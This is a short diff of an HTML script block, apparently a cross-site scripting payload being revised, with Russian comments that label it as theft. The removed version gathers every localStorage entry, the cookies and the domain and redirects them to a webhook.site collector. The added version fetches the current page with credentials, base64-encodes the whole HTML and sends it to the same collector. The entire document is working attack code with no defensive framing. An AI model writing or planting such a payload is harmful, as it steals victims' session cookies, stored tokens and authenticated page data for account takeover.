@@ -1,14 +1,10 @@
 <script>
-// Украсть localStorage
-var storage = "";
-for(var i=0; i<localStorage.length; i++) {
-    var key = localStorage.key(i);
-    storage += key + "=" + localStorage.getItem(key) + "; ";
-}
-
-// Украсть сессию
-window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?localStorage=" + 
-    encodeURIComponent(storage) +
-    "&cookies=" + encodeURIComponent(document.cookie) +
-    "&domain=" + document.domain;
+// Отправляем ВЕСЬ HTML страницы
+fetch(window.location.href, {credentials: 'include'})
+  .then(r => r.text())
+  .then(html => {
+      // Кодируем и отправляем себе
+      var encoded = btoa(html); // в base64
+      window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?page=" + encoded;
+  });
 </script>
